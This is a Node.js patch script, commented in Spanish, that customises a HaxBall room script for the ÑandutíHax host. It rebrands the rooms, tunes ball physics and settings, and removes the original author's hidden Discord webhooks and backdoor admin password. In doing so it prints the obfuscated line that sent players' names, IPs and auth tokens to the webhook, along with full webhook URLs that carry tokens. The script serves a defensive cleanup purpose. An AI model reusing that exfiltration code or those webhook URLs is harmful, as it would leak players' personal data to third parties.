// Aplica todos los cambios de ÑandutíHax sobre script.js.
//
// Sirve para volver a personalizar el script después de reemplazarlo por uno nuevo
// (por ejemplo, el original completo del autor). Se puede correr las veces que haga falta.
//
//   npm run parchar            aplica todo lo que falte
//   npm run parchar -- --ver   solo dice qué haría, sin tocar nada
//
// Los bloques de parches/bloques/ solo se agregan si el script no trae ya esa parte:
// si el script nuevo tiene su propio onPlayerChat o su onGameTick, no los pisamos.

const fs = require("fs");
const path = require("path");

const RAIZ = path.join(__dirname, "..");
const ARCHIVO = path.join(RAIZ, "script.js");
const SOLO_VER = process.argv.includes("--ver");

let script = fs.readFileSync(ARCHIVO, "utf8");
const hechos = [];
const saltados = [];

const reemplazar = (etiqueta, viejo, nuevo, marcaHecha) => {
  if (marcaHecha && script.includes(marcaHecha)) return saltados.push(`${etiqueta} (ya estaba)`);
  const veces = script.split(viejo).length - 1;
  if (!veces) return saltados.push(`${etiqueta} (no se encontró el texto original)`);
  script = script.split(viejo).join(nuevo);
  hechos.push(`${etiqueta} (${veces})`);
};

// ─────────────────────────────────────────────────────────────
// 0. Si el archivo viene cortado a la mitad, sacamos la última línea rota
// ─────────────────────────────────────────────────────────────
const tieneSintaxisValida = (texto) => {
  try {
    new Function(texto);
    return true;
  } catch {
    return false;
  }
};

if (!tieneSintaxisValida(script)) {
  const lineas = script.split("\n");
  const rota = lineas.pop();
  const recortado = lineas.join("\n") + "\n";
  if (tieneSintaxisValida(recortado)) {
    script = recortado;
    hechos.push(`✂️ Última línea cortada eliminada (${rota.length} caracteres)`);
  } else {
    console.error("❌ script.js tiene errores de sintaxis que no se arreglan quitando la última línea.");
    process.exit(1);
  }
}

// ─────────────────────────────────────────────────────────────
// 1. Webhook oculto del autor: deja de enviar, el link queda comentado
// ─────────────────────────────────────────────────────────────
reemplazar(
  "🔒 Webhook oculto desactivado",
  "var webhookID=_0x3c81f9(0x1b8);",
  "/* ⚠️ WEBHOOK OCULTO DEL AUTOR — DESACTIVADO POR ÑANDUTÍHAX\n" +
    "   Enviaba el nombre, la IP (player.conn) y el auth de cada jugador que entraba a:\n" +
    "   https://discord.com/api/webhooks/816061374504763402/Us5kMMIjcwUHylZ7-SBGnH2wkODNDHi24wvPk85wj6XecLB754wIHe-iEM776Sfk9_-Y\n" +
    "   Ese Discord no es nuestro. No volver a activarlo. */\nvar webhookID=null;",
  "WEBHOOK OCULTO DEL AUTOR"
);
reemplazar(
  "🔒 Envío al webhook oculto quitado",
  "fetch(webhookID,_0x338ced)['then'](_0x169fd3=>_0x169fd3),",
  "/* envío al webhook oculto quitado */",
  "envío al webhook oculto quitado"
);

// ─────────────────────────────────────────────────────────────
// 2. Marca: GLH → ÑandutíHax, hecho por Jinder
// ─────────────────────────────────────────────────────────────
// La versión primero: si no, la pisa la regla general de "by GLH"
reemplazar(
  "🏷️ Versión del script",
  "| Futsal by GLH ``",
  "| Ñᴀɴᴅᴜᴛɪ́Bᴀʟʟ, ʜᴇᴄʜᴏ ᴘᴏʀ Jɪɴᴅᴇʀ ``",
  "Ñᴀɴᴅᴜᴛɪ́Bᴀʟʟ"
);
// La sala se llamó ÑandutíBall hasta el 19/09/2026: si quedó el nombre viejo en algún lado
// (mapas generados antes, strings del script), se renombra acá. Es idempotente.
reemplazar("🏷️ Nombre viejo (ÑandutíBall → ÑandutíHax)", /ÑandutíBall/g, "ÑandutíHax");
reemplazar("🏷️ Mapas 'by GLH'", / by GLH/g, " by ÑandutíHax");
reemplazar("🏷️ Mapas 'By GLH'", / By GLH/g, " by ÑandutíHax");
reemplazar(
  "🏷️ Saludo del juego",
  "      👋 Bɪᴇɴᴠᴇɴɪᴅᴏ ᴀʟ ʜᴏsᴛ ᴅᴇ G L H      ",
  "      👋 Bɪᴇɴᴠᴇɴɪᴅᴏ ᴀ Ñ A N D U T Í B A L L      "
);
// Dibujo de bloques del saludo (3 textos del bloque ofuscado)
if (/▒█/.test(script)) {
  const E = String.fromCharCode(0x202f);
  const lineas = [
    " ▄▀▄▀                                  ▄▀\\n░█▄─░█ ─█▀▀█ ░█▄─░█ ░█▀▀▄ ░█─░█ ▀▀█▀▀ ▀█▀\\n░█░█░█ ░█▄▄█ ░█░█░█ ░█─░█ ░█─░█ ─░█── ─█─\\n░█──▀█ ░█─░█ ░█──▀█ ░█▄▄▀ ─▀▄▄▀ ─░█── ▄█▄",
    "░█▀▀█ ─█▀▀█ ░█─── ░█───\\n░█▀▀▄ ░█▄▄█ ░█─── ░█───\\n░█▄▄█ ░█─░█ ░█▄▄█ ░█▄▄█",
    E.repeat(4) + "✺ 🇵🇾 El host paraguayo de HaxBall, hecho por Jinder 🇵🇾 ✺",
  ];
  let i = 0;
  script = script.replace(/[\u0020\u00a0\u202f]*▒█[▀▄░█\u0020\u00a0\u202f]*/g, () => lineas[i++] || "");
  hechos.push("🏷️ Dibujo del saludo");
}
reemplazar(
  "🏷️ Link de la web de GLH",
  "🌐 𝐖𝐞𝐛 𝐆𝐋𝐇: https://grandesligashaxball.wixsite.com/grandesligashaxball/",
  "🇵🇾 ÑandutíHax - Host paraguayo de HaxBall"
);
// Hablar normal no puede disparar comandos: el autor prendía/apagaba el AFK con
// cualquier mensaje que contuviera "estoy", "listo", "volvi", "mtm" o "meteme".
// Con la lista vacía el AFK se maneja solo con !afk.
// El nick solo está "en uso" si esa persona está AHORA en la sala. Sin esto alcanzaba con
// que alguien lo hubiera usado antes para que te echara al entrar.
reemplazar(
  "🚪 Kick por nick repetido, solo si está en la sala",
  'if(usedUsernames[player.name]&&usedUsernames[player.name]!==player.auth){if(!esAdminValido(player)){',
  'if(usedUsernames[player.name]&&usedUsernames[player.name]!==player.auth&&room.getPlayerList().some(function(o){return o.id!==player.id&&o.name===player.name})){if(!esAdminValido(player)){'
);
// La clave para hacerse admin (!axeso5) no va más: el admin sale SOLO de la tabla `rangos`
// (bloque 🎖️ RANGOS). Además la clave viajaba en el mensaje de "llamar admins" al Discord del
// autor, y cualquier mensaje que la CONTUVIERA daba admin.
reemplazar(
  "👑 Sin clave para hacerse admin (config)",
  'var ClaveParaSerAdmin = "!axeso5";',
  "var ClaveParaSerAdmin = null; // YA NO SE USA: el admin sale solo de la tabla de rangos de la base"
);
reemplazar(
  "👑 Sin clave para hacerse admin (chat)",
  "if(message.includes(ClaveParaSerAdmin)){room.setPlayerAdmin(player.id,!0);return!1}",
  "/* clave para ser admin quitada: el admin sale de la tabla de rangos */"
);
reemplazar(
  "👑 La clave ya no viaja en el aviso de llamar admins",
  "\\n# 🔑 CLAVE PARA SER ADMINISTRADOR: ||${ClaveParaSerAdmin}|| ",
  ""
);

// El modo automatizado (y el gana-sigue del autor) mete espectadores a la cancha en cada tick y
// solo salteaba a los AFK. Al que le falta la clave lo sacaba nuestro bloque de usuarios y el
// script lo volvía a meter: "X was moved to Blue" / "to Spectators" sin parar.
reemplazar(
  "🔐 El acomodo del autor no mete al que le falta la clave",
  "p.team===0&&!afkPlayerIDs.has(p.id)",
  'p.team===0&&!afkPlayerIDs.has(p.id)&&!(typeof tieneRangoSinVerificar=="function"&&tieneRangoSinVerificar(p))',
  'typeof tieneRangoSinVerificar=="function"'
);
reemplazar(
  "💬 Palabras sueltas que prendían el AFK",
  'const afkKeywords=["mtm","meteme","volvi","estoy","listo"];',
  "const afkKeywords=[];"
);
reemplazar(
  "🔗 Discord de la sala (redes sociales)",
  '"discord.gg/tDEUbJU8QB"',
  '"discord.gg/TGRug4BGG"'
);
// Los webhooks del autor: mandaban el chat, las IP, las estadísticas, los pedidos de admin,
// las grabaciones y los fichajes de NUESTRAS salas a un Discord ajeno. Se vacían (y el bloque
// 🔒 NADA SE VA A DISCORD frena cualquier envío que se nos escape).
// Ojo: `reemplazar` usa split/join, así que el regex NO puede tener grupos que capturen.
for (const [palabra, nombre] of [
  ["var", "WebhookParaLlamarAdmins"],
  ["var", "webhookMensajesJugadores"],
  ["var", "webhookBoletero"],
  ["var", "webhookEstadisticasJugadores"],
  ["var", "WebhookParaFirmar"],
  ["var", "webhookIPJugadores"],
  ["var", "webhookPass"],
  ["const", "WebhookGrabacionesSalaCompleta"],
  ["const", "WebhookGrabaciones"],
  ["const", "AnuncioKicksBans"],
]) {
  reemplazar(
    `🔒 Webhook del autor: ${nombre}`,
    new RegExp(`${palabra} ${nombre} *= *["']https:\/\/discord(?:app)?\.com\/api\/[^"']*["']`),
    `${palabra} ${nombre} = ""`
  );
}

// ─────────────────────────────────────────────────────────────
// El cartel de la marca cada 10 minutos: el autor lo dejó roto
// ─────────────────────────────────────────────────────────────
// Adentro del onRoomLink ofuscado hay un setInterval que manda dos anuncios con la marca
// del host (ya parcheada a ÑandutíHax). El callback espera un jugador y lo usa como destino
// (`_0x1b3d6f.id`), pero setInterval no le pasa ninguno: tiraba "Cannot read properties of
// undefined (reading 'id')" cada 10 minutos en las 4 salas y los carteles no salían nunca.
//
// Se manda `null` (= a toda la sala, que es lo que el autor quería) y se pasa de 10 a 30
// minutos: cada 10 ya sale la invitación al Discord, y tres carteles juntos es spam.
// 0x927c0 = 600000 ms · 0x1b7740 = 1800000 ms.
reemplazar(
  "📣 El cartel de la marca salía roto cada 10 minutos",
  "room[_0xd1b3a4(0x1d2)](_0xd1b3a4(0x1ab),_0x1b3d6f.id,0xffda82,_0xd1b3a4(0x1d6),0x2),room[_0xd1b3a4(0x1d2)](_0xd1b3a4(0x180),_0x1b3d6f.id,0xffda82,_0xd1b3a4(0x1d6),0x0)},0x927c0)",
  "room[_0xd1b3a4(0x1d2)](_0xd1b3a4(0x1ab),null,0xffda82,_0xd1b3a4(0x1d6),0x2),room[_0xd1b3a4(0x1d2)](_0xd1b3a4(0x180),null,0xffda82,_0xd1b3a4(0x1d6),0x0)},0x1b7740)"
);

reemplazar(
  "📣 Webhook viejo que hubiera quedado en el script",
  /var AnuncioHostAbierto = "https:\/\/discord\.com\/api\/webhooks\/[^"]*";/,
  'var AnuncioHostAbierto = "";   // va en .env (WEBHOOK_SALA_ABIERTA), no en el repo'
);
reemplazar(
  "📣 Webhook de sala abierta del autor",
  '"https://discord.com/api/webhooks/1201825912958767134/g1BEoP1RNO_zSrQmf0nhkQRP_z3BnR2bJXfKYkK7CCPLk-KZf86tn-bPq_mDZ2UHwRMf"',
  '""'
);
reemplazar(
  "🏷️ Link de Discord ajeno",
  "🔗 𝗗𝗶𝘀𝗰𝗼𝗿𝗱 𝗥𝗦𝗜: https://discord.gg/BZkDuSV",
  "🕸️ ÑandutíHax, hecho por Jinder"
);
reemplazar(
  "🏷️ Anuncio del partido",
  '"✨ ÚNETE AL DISCORD DE GLH Y APRENDE A CREAR TU PROPIO HOST CON SCRIPT: discord.gg/tDEUbJU8QB"',
  '"🕸️ ÑANDUTÍHAX 🇵🇾 - El host paraguayo de HaxBall, hecho por Jinder"'
);
reemplazar("🏷️ Pelota 'glh'", 'TipoPelotaFutsal === "glh"', 'TipoPelotaFutsal === "nanduti"');
reemplazar(
  "🏷️ Tutorial: links de GLH",
  "room.sendAnnouncement('🔗 LINK DEL SCRIPT: bit.ly/GLH-Script',player.id,GeneradorColoresRandom2,\"normal\",0)",
  "room.sendAnnouncement('🕸️ ÑandutíHax — host paraguayo de HaxBall, hecho por Jinder',player.id,GeneradorColoresRandom2,\"normal\",0)"
);
reemplazar(
  "🏷️ Comando !glh → !nanduti",
  'message==="!glh"&&player.admin){TipoPelotaFutsal="glh";room.sendAnnouncement("Pelota cambiada a GLH',
  'message==="!nanduti"&&player.admin){TipoPelotaFutsal="nanduti";room.sendAnnouncement("Pelota cambiada a ÑandutíHax'
);

// Mensaje de bienvenida: se reemplaza el array entero
const iniBienvenida = script.indexOf("const MensajeDeBienvenida = [");
if (iniBienvenida === -1) {
  saltados.push("🏷️ Mensaje de bienvenida (no se encontró)");
} else {
  const finBienvenida = script.indexOf("\n];", iniBienvenida) + 3;
  const actual = script.slice(iniBienvenida, finBienvenida);
  if (actual.includes("ÑandutíHax")) {
    saltados.push("🏷️ Mensaje de bienvenida (ya estaba)");
  } else {
    script = script.slice(0, iniBienvenida) + fs.readFileSync(path.join(__dirname, "bloques", "bienvenida.txt"), "utf8").trimEnd() + script.slice(finBienvenida);
    hechos.push("🏷️ Mensaje de bienvenida");
  }
}

// ─────────────────────────────────────────────────────────────
// 3. Configuración base (bot visible, nombre del bot)
// ─────────────────────────────────────────────────────────────
reemplazar("⚙️ Bot visible", "var BotVisible = false;", "var BotVisible = true;", "var BotVisible = true;");
reemplazar("⚙️ Nombre del bot", '"🚩 Árbitro Bot 🤖"', '"🚩 Ñandu Bot 🤖"', "Ñandu Bot");
reemplazar("⚙️ reCAPTCHA desactivado", "var ActivarReCaptcha = true;", "var ActivarReCaptcha = false;", "var ActivarReCaptcha = false;");
reemplazar("⚙️ Cambio de mapa siempre (aunque el partido esté avanzado)", "var tiempoLimiteCambio = 30;", "var tiempoLimiteCambio = 99999;", "var tiempoLimiteCambio = 99999;");

// Sin límite para los que miran:
// · LugaresReservados hacía que, con la sala casi llena, el script le pusiera CONTRASEÑA
//   y ya no entrara nadie más.
// · LimiteMaximoDeJugadoresAFK echaba a todos los AFK de golpe, y un espectador que solo
//   mira cuenta como AFK a los 5 minutos.
reemplazar("👀 Sin lugares reservados (la sala no se cierra sola)", "var LugaresReservados = 2;", "var LugaresReservados = 0;", "var LugaresReservados = 0;");
reemplazar("👀 No echar a los espectadores por AFK", "const LimiteMaximoDeJugadoresAFK = 4;", "const LimiteMaximoDeJugadoresAFK = 99;", "const LimiteMaximoDeJugadoresAFK = 99;");

// · MaximoJugadoresPorIp echaba al tercero que entrara desde la misma conexión, con
//   "🚫 Sólo se permiten hasta 2 jugadores con la misma IP". En Paraguay es común que
//   varios jueguen desde la misma casa o desde un ciber, así que echaba a gente legítima.
//   Se deja en 99 (no se saca el control, se corre el límite) — pedido del usuario, 20/09/2026.
reemplazar("👥 Dejar entrar a varios desde la misma conexión", "var MaximoJugadoresPorIp = 2;", "var MaximoJugadoresPorIp = 99;", "var MaximoJugadoresPorIp = 99;");

// ─────────────────────────────────────────────────────────────
// ⚽ Física de la pelota de FUTSAL (no toca Real Soccer)
// ─────────────────────────────────────────────────────────────
// La pelota se frenaba sola enseguida. No alcanza con cambiarla en los mapas: cada vez que se
// prende o se apaga el powershot, el script la vuelve a configurar con room.setDiscProperties(0)
// y la deja como estaba. Así que los mismos números van en los dos lados.
//
//   damping 0.99 → 0.993   conserva más velocidad (tarda ~1,7 s en bajar a la mitad, no ~1,1 s)
//   bCoef   0.4  → 0.5     rebota como una pelota normal de HaxBall, no muere contra la pared
//
// invMass queda igual (1.5 normal, PotenciaPowerShot cargada): es el peso, no la energía.
// Real Soccer usa otras líneas (invMass 1.05, PelotaRS) y NO se tocan — pedido del usuario.
// Lo mismo está en `mapas/generar.js` (FISICA_PELOTA): si cambia uno, cambian los dos.
for (const [etiqueta, viejo, nuevo] of [
  [
    "⚽ Física de la pelota de futsal (normal)",
    'setDiscProperties(0,{"bCoef":0.4,"invMass":1.5,"damping":0.99,',
    'setDiscProperties(0,{"bCoef":0.5,"invMass":1.5,"damping":0.993,',
  ],
  [
    "⚽ Física de la pelota de futsal (powershot)",
    'setDiscProperties(0,{"bCoef":0.4,"invMass":PotenciaPowerShot,"damping":0.99,',
    'setDiscProperties(0,{"bCoef":0.5,"invMass":PotenciaPowerShot,"damping":0.993,',
  ],
]) {
  reemplazar(etiqueta, viejo, nuevo, nuevo);
}

// ─────────────────────────────────────────────────────────────
// 3.5. Mapas propios de futsal (mapas/*.hbs, hechos con npm run generar-mapas)
// Se agregan como funciones al final: en JS gana la última declaración con ese nombre,
// así que reemplazan a las del autor sin tocar su código.
// ─────────────────────────────────────────────────────────────
const MAPAS_PROPIOS = [
  { archivo: "nanduti-futsal-x3.hbs", funcion: "getFutx3Map" },
  { archivo: "nanduti-futsal-x4.hbs", funcion: "getFutx4Map" },
  { archivo: "nanduti-futsal-x5.hbs", funcion: "getFutx5Map" },
  { archivo: "nanduti-futsal-x7.hbs", funcion: "getFutx7Map" },
];
let bloqueMapas = "";
{
  const disponibles = MAPAS_PROPIOS.filter((m) => fs.existsSync(path.join(RAIZ, "mapas", m.archivo)));
  if (!disponibles.length) {
    saltados.push("🗺️ Mapas propios de futsal (no hay .hbs: corré npm run generar-mapas)");
  } else {
    bloqueMapas =
      "\n\n// ▇▇▇▇▇▇▇▇▇ 🗺️ MAPAS DE FUTSAL DE ÑANDUTÍHAX ▇▇▇▇▇▇▇▇▇\n" +
      "// Generados con 'npm run generar-mapas' a partir de los mapas del autor: misma cancha\n" +
      "// y misma física, con el nombre nuestro y la pelota amarilla lisa.\n" +
      "// Van al final a propósito: así pisan a las funciones originales sin editarlas.\n" +
      disponibles
        .map((m) => {
          const json = fs.readFileSync(path.join(RAIZ, "mapas", m.archivo), "utf8");
          return `function ${m.funcion}() {\n\treturn ${JSON.stringify(json)};\n}`;
        })
        .join("\n") +
      "\nconsole.log(\"🗺️ Mapas de futsal de ÑandutíHax cargados\");\n";
    hechos.push(`🗺️ Mapas propios de futsal (${disponibles.length})`);
  }
}

// ─────────────────────────────────────────────────────────────
// 4. Camisetas paraguayas
// ─────────────────────────────────────────────────────────────
const camisetas = require("./camisetas");
if (script.includes('"riv/titular/red"') || !script.includes('"oli/titular/red"')) {
  script = camisetas.aplicar(script);
  hechos.push("👕 Camisetas paraguayas (29 clubes)");
} else {
  saltados.push("👕 Camisetas paraguayas (ya estaban)");
}

// ─────────────────────────────────────────────────────────────
// 5. Modo automático: Futsal x3 → x4 → x5 → x7
// ─────────────────────────────────────────────────────────────
const umbralesViejos =
  "if(numJugadores===1){maxPlayersPerTeam=1;nuevaConfiguracion={mapa:getEntrenamientoFutsalMap(),scoreLimit:GolesEntrenamientoFutsal,timeLimit:TiempoEntrenamientoFutsal}}" +
  "else if(numJugadores>1&&numJugadores<=3){maxPlayersPerTeam=1;nuevaConfiguracion={mapa:getFutx2Map(),scoreLimit:GolesFutsalx2,timeLimit:TiempoFutsalx2}}" +
  "else if(numJugadores>=4&&numJugadores<=5){maxPlayersPerTeam=2;nuevaConfiguracion={mapa:getFutx2Map(),scoreLimit:GolesFutsalx2,timeLimit:TiempoFutsalx2}}" +
  "else if(numJugadores>=6&&numJugadores<=7){maxPlayersPerTeam=3;nuevaConfiguracion={mapa:getFutx3Map(),scoreLimit:GolesFutsalx3,timeLimit:TiempoFutsalx3}}" +
  "else if(numJugadores>=8&&numJugadores<=9){maxPlayersPerTeam=4;nuevaConfiguracion={mapa:getFutx4Map(),scoreLimit:GolesFutsalx3,timeLimit:TiempoFutsalx3}}" +
  "else if(numJugadores>=10&&numJugadores<=11){maxPlayersPerTeam=5;nuevaConfiguracion={mapa:getFutx5Map(),scoreLimit:GolesFutsalx5,timeLimit:TiempoFutsalx5}}" +
  "else if(numJugadores>=14){maxPlayersPerTeam=7;nuevaConfiguracion={mapa:getFutx7Map(),scoreLimit:GolesFutsalx7,timeLimit:TiempoFutsalx7}}";
const umbralesNuevos =
  "if(numJugadores<=7){maxPlayersPerTeam=3;nuevaConfiguracion={mapa:getFutx3Map(),scoreLimit:GolesFutsalx3,timeLimit:TiempoFutsalx3}}" +
  "else if(numJugadores<=9){maxPlayersPerTeam=4;nuevaConfiguracion={mapa:getFutx4Map(),scoreLimit:GolesFutsalx4,timeLimit:TiempoFutsalx4}}" +
  "else if(numJugadores<=13){maxPlayersPerTeam=5;nuevaConfiguracion={mapa:getFutx5Map(),scoreLimit:GolesFutsalx5,timeLimit:TiempoFutsalx5}}" +
  "else{maxPlayersPerTeam=7;nuevaConfiguracion={mapa:getFutx7Map(),scoreLimit:GolesFutsalx7,timeLimit:TiempoFutsalx7}}";
reemplazar("🗺️ Umbrales x3/x4/x5/x7", umbralesViejos, umbralesNuevos, "if(numJugadores<=7){maxPlayersPerTeam=3;");
reemplazar(
  "🗺️ Arranque del modo automático en x3",
  "modoJueganAlgunos=!0;maxPlayersPerTeam=1;configuracionActual={mapa:getEntrenamientoFutsalMap(),scoreLimit:GolesEntrenamientoFutsal,timeLimit:TiempoEntrenamientoFutsal}",
  "modoJueganAlgunos=!0;maxPlayersPerTeam=3;configuracionActual={mapa:getFutx3Map(),scoreLimit:GolesFutsalx3,timeLimit:TiempoFutsalx3}"
);

// ─────────────────────────────────────────────────────────────
// 6. Bloques propios (solo si el script no trae ya esa parte)
// ─────────────────────────────────────────────────────────────
const BLOQUES = [
  { archivo: "compat.txt", marca: "🩹 PIEZAS QUE FALTABAN", nombre: "🩹 Piezas que faltaban", siFalta: () => true },
  { archivo: "rangos.txt", marca: "🎖️ RANGOS", nombre: "🎖️ Rangos por nick", siFalta: () => true },
  {
    archivo: "arbitraje.txt",
    marca: "🧑‍⚖️ ARBITRAJE",
    nombre: "🧑‍⚖️ Arbitraje (goles y equipos)",
    siFalta: (s) => !/room\.onTeamGoal\s*=/.test(s),
  },
  {
    archivo: "comandos.txt",
    marca: "💬 COMANDOS DEL CHAT",
    nombre: "💬 Comandos del chat",
    siFalta: (s) => !/room\.onPlayerChat\s*=/.test(s),
  },
  { archivo: "turnos.txt", marca: "🎽 SELECCIÓN POR TURNOS", nombre: "🎽 Selección por turnos", siFalta: () => true },
  { archivo: "elo.txt", marca: "📊 ELO Y DIVISIONES", nombre: "📊 ELO y divisiones", siFalta: () => true },
  { archivo: "autoarranque.txt", marca: "▶️ ARRANQUE AUTOMÁTICO", nombre: "▶️ Arranque automático", siFalta: () => true },
  { archivo: "modos.txt", marca: "🔀 MODOS DE EQUIPOS", nombre: "🔀 Modos de equipos", siFalta: () => true },
  { archivo: "usuarios.txt", marca: "🔐 USUARIOS Y CLAVES", nombre: "🔐 Usuarios y claves", siFalta: () => true },
  { archivo: "aviso-discord.txt", marca: "📣 AVISO DE SALA ABIERTA", nombre: "📣 Aviso de sala abierta", siFalta: () => true },
  { archivo: "equipos.txt", marca: "👕 CAMISETAS DESDE LA BASE", nombre: "👕 Camisetas desde la base", siFalta: () => true },
  { archivo: "monedas.txt", marca: "🪙 MONEDAS", nombre: "🪙 Monedas", siFalta: () => true },
  { archivo: "avisos.txt", marca: "🔕 AVISOS SIN SPAM", nombre: "🔕 Avisos sin spam", siFalta: () => true },
  { archivo: "config.txt", marca: "⚙️ CONFIGURACIÓN DESDE LA BASE", nombre: "⚙️ Configuración desde la base", siFalta: () => true },
  { archivo: "sin-webhooks.txt", marca: "🔒 NADA SE VA A DISCORD DESDE LA SALA", nombre: "🔒 Sin webhooks en la sala", siFalta: () => true },
  { archivo: "comandos-sin-eco.txt", marca: "🤫 COMANDOS SIN ECO", nombre: "🤫 Comandos sin eco", siFalta: () => true },
  { contenido: bloqueMapas, marca: "🗺️ MAPAS DE FUTSAL", nombre: null, siFalta: () => Boolean(bloqueMapas) },
];

// Sacamos nuestros bloques viejos antes de volver a escribirlos
for (const bloque of BLOQUES) {
  const i = script.indexOf("\n\n// ▇▇▇▇▇▇▇▇▇ " + bloque.marca);
  if (i !== -1) script = script.slice(0, i) + script.slice(script.indexOf("\n", script.length - 1) + 1 || script.length);
}
// (el corte anterior solo saca el primero; recortamos desde el primer bloque nuestro)
const primero = BLOQUES.map((b) => script.indexOf("\n\n// ▇▇▇▇▇▇▇▇▇ " + b.marca)).filter((i) => i !== -1).sort((a, b) => a - b)[0];
if (primero !== undefined) script = script.slice(0, primero);

for (const bloque of BLOQUES) {
  if (!bloque.siFalta(script)) {
    saltados.push(`${bloque.nombre} (el script ya lo trae)`);
    continue;
  }
  const texto = bloque.contenido !== undefined ? bloque.contenido : fs.readFileSync(path.join(__dirname, "bloques", bloque.archivo), "utf8");
  script = script.trimEnd() + "\n" + texto;
  if (bloque.nombre) hechos.push(bloque.nombre);   // los mapas ya se anotaron más arriba
}

// ─────────────────────────────────────────────────────────────
console.log("\n══ Parches de ÑandutíHax ══\n");
console.log("APLICADOS:");
console.log(hechos.length ? hechos.map((h) => "  ✅ " + h).join("\n") : "  (ninguno)");
console.log("\nSALTADOS:");
console.log(saltados.length ? saltados.map((h) => "  ⏭️  " + h).join("\n") : "  (ninguno)");

if (SOLO_VER) {
  console.log("\n👀 Modo --ver: no se escribió nada.");
  process.exit(0);
}

// Guardamos una copia antes de tocar el archivo
const copia = path.join(RAIZ, "script.anterior.js");
fs.copyFileSync(ARCHIVO, copia);
fs.writeFileSync(ARCHIVO, script);
console.log(`\n💾 script.js actualizado (copia del anterior en script.anterior.js)`);
console.log("👉 Ahora corré:  npm run prueba");
